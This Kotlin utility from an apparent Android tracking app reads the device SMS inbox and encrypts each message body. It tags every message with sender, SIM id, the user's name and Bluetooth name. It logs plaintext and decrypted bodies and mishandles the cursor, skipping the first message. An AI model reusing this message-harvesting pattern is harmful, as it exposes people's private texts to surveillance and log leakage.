package com.mobile.tracer.utils

import android.annotation.SuppressLint
import android.database.Cursor
import android.net.Uri
import com.mobile.tracer.BuildConfig
import com.mobile.tracer.MobileTracerApplication
import com.mobile.tracer.model.CustomMessage
import java.lang.Exception

/**
 * Created by Krishna Upadhya on 2019-12-24.
 */
object InboxUtil {

    @SuppressLint("Recycle")
    fun getInboxMessages(inboxFilterDate: Long): List<CustomMessage> {
        val list = mutableListOf<CustomMessage>()

        val filter = "date>=$inboxFilterDate"
        val sms = mutableListOf<Any>()

        val uriSms = Uri.parse("content://sms/inbox")
        val cursor = MobileTracerApplication.applicationInstance.contentResolver?.query(
            uriSms,
            arrayOf("_id", "address", "date", "body", "sub_id"),
            filter,
            null,
            null
        )
        try {
            cursor?.moveToFirst()

            if (cursor?.moveToNext() != null) {
                val customMessage = getCustomMessage(cursor);
                list.add(customMessage)
                while (cursor.moveToNext()) {
                    val customMessage = getCustomMessage(cursor);
                    list.add(customMessage)
                }
            }
        } catch (e: Exception) {
            Logger.log("Error while getting messages ${e.message}")
        }

        return list;
    }

    private fun getCustomMessage(cursor: Cursor): CustomMessage {
        val sender = cursor.getString(1)
        val date = GenericUtils.formatDate(
            cursor.getString(2),
            AppConstants.DATE_FORMAT
        )
        val body = cursor.getString(3)
        val simId = cursor.getString(4)
        Logger.log("ECYU body $body")
        val encryptedMsg = EncryptDecryptUtil.encryptMsg(
            body,
            EncryptDecryptUtil.generateKey(BuildConfig.SECRET_KEY)
        )

        Logger.log(
            "ECYU encrypted body $encryptedMsg"
        )
        val decryptedMsg = EncryptDecryptUtil.decrypt(
            encryptedMsg,
            EncryptDecryptUtil.generateKey(BuildConfig.SECRET_KEY)
        )
        Logger.log(
            "ECYU decrypted body $decryptedMsg"
        )

        val customMessage =
            CustomMessage(
                EncryptDecryptUtil.encryptMsg(
                    body,
                    EncryptDecryptUtil.generateKey(BuildConfig.SECRET_KEY)
                ),
                date,
                sender,
                GenericUtils.getUserNameFromEmail(),
                GenericUtils.getBluetoothName(),
                simId
            )
        Logger.log("-------- sent by ${customMessage.sender} at ${customMessage.date} \n ${customMessage.message}")
        return customMessage
    }
}